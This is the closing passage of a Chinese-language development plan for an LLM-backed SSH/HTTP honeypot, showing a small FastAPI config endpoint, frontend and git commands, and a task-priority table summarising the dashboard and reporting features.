- [ ] **Step 3: 在 `layer3/stats_api.py` 加入 `/api/config` 端點**

```python
import os

@app.get("/api/config")
def get_config():
    return {
        "ollama_model": os.getenv("OLLAMA_MODEL", "llama3.1"),
        "ollama_report_model": os.getenv("OLLAMA_REPORT_MODEL", os.getenv("OLLAMA_MODEL", "llama3.1")),
        "ssh_port": os.getenv("SSH_PORT", "2222"),
        "http_port": os.getenv("HTTP_PORT", "8080"),
        "ollama_host": os.getenv("OLLAMA_HOST", "http://localhost:11434"),
    }
```

- [ ] **Step 4: 確認前端正常顯示**

```bash
cd honeypot/layer3/frontend && npm run dev
```
打開 http://localhost:5173，確認 Dashboard 下方出現 Top Commands 長條圖。

- [ ] **Step 5: Commit**

```bash
git add honeypot/layer3/frontend/src/components/CommandChart.tsx \
        honeypot/layer3/frontend/src/pages/Dashboard.tsx \
        honeypot/layer3/stats_api.py
git commit -m "feat(layer3): 補上 Top Commands 長條圖 + /api/config 端點"
```

---

## 整體執行順序

| 優先 | Task | 預估時間 | 影響 |
|------|------|---------|------|
| 1 | Task 1：整合 shared/models | 5 min | 程式碼乾淨度 |
| 2 | Task 2：雙模型 + temperature | 10 min | AI 回應品質 |
| 3 | Task 3：SSH 真實認證 | 15 min | 系統真實性 |
| 4 | Task 4：改善 Prompt | 15 min | AI 一致性 |
| 5 | Task 5：history 帶回應 | 10 min | AI 一致性 |
| 6 | Task 6：WebSocket 接線 | 20 min | Dashboard 功能 |
| 7 | Task 7：自動報告 | 10 min | 使用便利性 |
| 8 | Task 8：Critical 等級 + HTTP intent | 15 min | 分析完整性 |
| 9 | Task 9：MITRE ATT&CK 報告 | 10 min | 報告品質 |
| 10 | Task 10：CommandChart + config | 20 min | 前端完整性 |

**所有 Task 完成後，整個系統的狀態：**
- SSH 蜜罐：真實弱密碼認證、AI 前後一致、自動報告
- HTTP 蜜罐：意圖分析、即時 Dashboard
- AI：終端用 llama3.1:8b-q8（快速精確），報告用 qwen2.5:14b-q4（高品質）
- Dashboard：即時串流、意圖圓餅圖、Top Commands 長條圖、自動威脅報告
